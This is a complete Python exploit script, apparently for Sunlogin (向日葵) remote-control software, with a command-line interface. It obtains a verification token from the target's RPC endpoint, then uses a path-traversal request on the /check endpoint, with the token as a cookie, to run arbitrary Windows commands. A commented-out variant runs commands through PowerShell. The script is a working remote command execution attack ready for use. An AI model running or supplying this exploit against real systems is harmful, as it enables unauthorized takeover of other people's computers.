from optparse import OptionParser
import requests
import json


def title():
    print("""
        ===========================================
            向日葵远程命令执行漏洞  By j2ekim
        ===========================================
        """)


def gettoken(ip, port):
    print("http://" + ip + ":" + port)
    url = "http://" + ip + ":" + port + "/cgi-bin/rpc?action=verify-haras"
    try:
        res = json.loads(requests.get(url,verify=False, timeout=5).text)
        print(res['verify_string'])
        return res['verify_string']
    except requests.exceptions.ConnectTimeout as _:
        print ("fail", "ConnectTimeout")
    except Exception as _:
        print ("fail", "Error")


def RunCmd(ip, port, command,token):
    poc1 = "http://" + ip + ":" + port + "/check?cmd=ping../../../../../../windows/system32/" + command
    # poc2 = "http://" + ip + ":" + port + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+"+ cmd
    cookies = {"CID": token}
    # print(cookies)
    try:
        resu = requests.get(poc1, cookies=cookies, timeout=5,verify=False).text
        print(resu)
    except Exception as _:
        return ("fail", "Error_")


def main(host, port,command):
    # print(usage)
    token = gettoken(host, port)
    RunCmd(host, port, command, token)
    # portscan(host)


if __name__ == '__main__':
    title()
    usage = ("Usage: exp.py -a [--host] -p [port] -c [--command] \n"
             "exp.py -u http://127.0.0.1 -c whoami\n")
    parser = OptionParser(usage=usage)
    parser.add_option('-a', '--host', dest='hosts', help='help')
    parser.add_option('-p', '--port', dest='port', help='help')
    parser.add_option('-c', '--command', dest='command', help='help')
    parser.add_option('-f', '--file', dest='file', help='help')
    (option, args) = parser.parse_args()
    host = option.hosts
    port = option.port
    command = option.command
    file = option.file
    if host is None or command is None or port is None:
        print(usage)
    else:
        main(host, port,command)